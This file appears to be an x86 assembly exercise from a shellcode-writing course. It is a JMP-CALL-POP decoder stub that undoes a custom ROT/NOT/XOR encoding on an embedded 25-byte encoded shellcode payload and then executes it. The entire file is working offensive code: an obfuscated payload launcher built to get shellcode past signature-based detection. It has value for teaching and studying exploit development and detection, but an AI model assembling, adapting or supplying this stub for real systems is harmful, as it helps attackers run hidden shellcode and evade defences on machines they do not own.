; ROT NOT XOR XOR Decoder
; Author: Nipun Jaswal
; SLAE-ID: 1080

global _start

section .text

_start:
	jmp short call_decoder		; JUMP - CALL - POP Sequence Starts
decoder:
	pop esi				; Address of the Shellcode ---> ESI
	xor ecx, ecx			; Clearing out ECX
	mov cl, len			; Length of Shellcode to ECX
decode:
	cmp byte [esi], 0x83		; Compare the First and Consecutive Bytes with 131(0x83)
	jl func_adjust			; If Matches go to func
	sub byte [esi], 0x83		; Else Subtract 131 from the Byte
	not byte [esi]			; Not the Byte
	xor byte [esi], 0xCF		; Xor the Byte
	xor byte [esi], 0xAA		; Xor the Byte
	jmp short loop_shellcode	; Jump to func2

func_adjust:
	xor edx, edx			; Clearing EDX
	mov dl, 0x83		        ; Move 131 to EDX
	sub dl, byte [esi]		; Subtract the Byte Value from 131
	xor ebx,ebx			; Clearing EBX
	mov bl, 0xff			; Moving 0xff to EBX
	inc ebx				; Inc EBX
	sub bx, dx			; Subtract 16-bit DX from BX
	mov byte [esi], bl		; Moving Final Bl value to Current Byte Location

loop_shellcode:
	inc esi				; Move to Next Byte
	loop decode			; Repeat the Process for All the Shellcode
	jmp short shellcode		; Finally Jump to the Shellcode

call_decoder:
	call decoder			; Call to Decoder but pushes address of the Shellcode on the Stack
	shellcode:
	db 0x2e,0xdd,0x4d,0x75,0x38,0x38,0x6c,0x75,0x75,0x38,0x7b,0x76,0x77,0x96,0xfc,0x4d,0x96,0xfb,0x4c,0x96,0xfe,0xad,0x14,0xda,0x9d
	len: equ $-shellcode
